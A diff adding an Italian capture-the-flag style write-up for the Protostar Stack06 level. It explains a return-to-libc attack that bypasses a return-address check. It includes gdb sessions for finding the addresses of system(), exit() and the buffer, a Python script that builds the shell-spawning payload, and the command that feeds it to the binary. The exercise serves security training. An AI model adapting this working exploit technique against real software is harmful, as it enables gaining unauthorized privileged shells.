@@ -484,12 +484,80 @@ A questo punto non ci resta che invocare il binario per provoare lo shell code.
 - il secondo accetta input da STDIN e lo inoltra alla shell
 
 
+<br><br>
 
-## Stack05
+## Stack06
+
+Il binario in questione contiene un programma che invoca una funzione nella quale viene preso in input un buffer e subito dopo viene controllato l’indirizzo di ritorno.
+Se esso è sullo stack del programma (e quindi è in corso un attacco che cerca di saltare ad uno shellcode) si esce con un errore.  
+L'obiettivo è ottenere una shell con privilegi aggirando questa contromisura, nello specifico si sfrutta l'exploit `return-to-libc`, invece di saltare a indirizzi dentro lo stack di salta direttamente a un indirizzo di libreria, in questo modo si aggira la contromisura (che controlla solamente che l'indirizzo non sia sullo stack).  
 
 
+Per l'attacco ci occorre avere:
+- Indirizzo di `system()` 
+- Indirizzo di `exit()`
+- Indirizzo del `buffer` per calcolare il padding
+
+Dovremo fornire a `system()` i suoi argomenti, costruendo un 'falso' stack frame che la funzione possa usare, infatti useremo l'indirizzo di `exit()` come punto di ritorno per `system()` per garantire una terminazione pulita e l'indirizzo del buffer come parametro (dove come parametro avremo /bin/sh).  
+Stiamo quindi creando uno stack frame 'finto' per `system` all'interno del buffer.  
+
+![stack](../../images/stack6stack.png)
 
 
+Il nostro input malevolo finale sarà strutturato così:
+
+```
+[Stringa "/bin/sh"] + [Riempimento] + [Indirizzo di system()] + [Indirizzo di exit()] + [Indirizzo del buffer]
+```
+
+Per ottnere le informazioni che ci servono utilizziamo il debugger gdb:
+
+```bash
+gdb /opt/protostar/bin/stack6
+unset env LINES
+unset env COLUMNS
+start 
+
+p system 
+$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
+p exit 
+$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>
+
+disas getpath 
+...
+0x080484a4 <getpath+32>:	lea    -0x4c(%ebp),%eax
+0x080484a7 <getpath+35>:	mov    %eax,(%esp)
+0x080484aa <getpath+38>:	call   0x8048380 <gets@plt>
+...
+b * 0x080484a7
+c 
+x/x $eax
+0xbffffc8c:	0xb7f0186e # &buffer
+p $ebp+4-$eax
+$3 = (void *) 0x50 #0x50=80 distanza tra &buffer - &ritorno
+```
+
+A questo punto abbiamo tutto quello che ci serve, ci basterà generare lo script python che ci darà il payload malevolo che useremo.  
+
+```python
+buffer:0xbffffc8c
+system:0xb7ecffb0
+exit:0xb7ec60c0
+
+# dobbiamo invertirli per rispettare arch little endian 
+buffer='\x8c\xfc\xff\xbf'
+system='\xb0\xff\xec\xb7'
+exit='\xc0\x60\xec\xb7'
+
+print '/bin//sh\x00'+'a'*71+'\xb0\xff\xec\xb7'+'\xc0\x60\xec\xb7'+'\x8c\xfc\xff\xbf'
+# print(f"/bin//sh\x00+'a'*71+{system}+{exit}+{buffer}")
+```
+generiamo il payload con `python payload.py > payload` 
+e lo lanciamo usando il doppio `cat`  
+
+`(cat payload ; cat) | /opt/protostar/bin/stack6`
+
+<br><br>
 
 <center>
 
